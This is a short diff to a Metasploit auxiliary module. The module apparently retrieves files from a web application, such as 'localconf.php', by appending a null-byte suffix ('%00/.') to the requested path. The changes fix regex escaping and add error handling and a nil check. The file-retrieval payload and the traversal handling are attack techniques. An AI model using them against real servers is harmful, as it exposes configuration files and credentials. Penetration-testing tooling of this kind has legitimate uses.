@@ -53,9 +53,9 @@ class Metasploit4 < Msf::Auxiliary
 	case datastore['RFILE']
 	when nil
 		# Nothing
-	when /localconf.php$/i
+	when /localconf\.php$/i
 		jumpurl = "#{datastore['RFILE']}%00/."
-	when /^..(\/|\\)/i
+	when /^\.\.(\/|\\)/i
 		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
 	else
 		jumpurl = "#{datastore['RFILE']}"
@@ -99,8 +99,15 @@ class Metasploit4 < Msf::Auxiliary
 				},25)
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			return
 		rescue ::Timeout::Error, ::Errno::EPIPE => e
 			print_error(e.message)
+			return
+		end
+
+		if file.nil?
+			print_error("Connection timed out")
+			return
 		end
 
 		if ((counter.to_f/queue.length.to_f)*100.0).to_s =~ /\d0.0$/ # Display percentage complete every 10%
@@ -108,6 +115,7 @@ class Metasploit4 < Msf::Auxiliary
 			print_status("Requests #{percentage.to_i}% complete - [#{counter} / #{queue.length}]")
 		end
 
+		# file can be nil
 		case file.headers['Content-Type']
 		when 'text/html'
 			case file.body
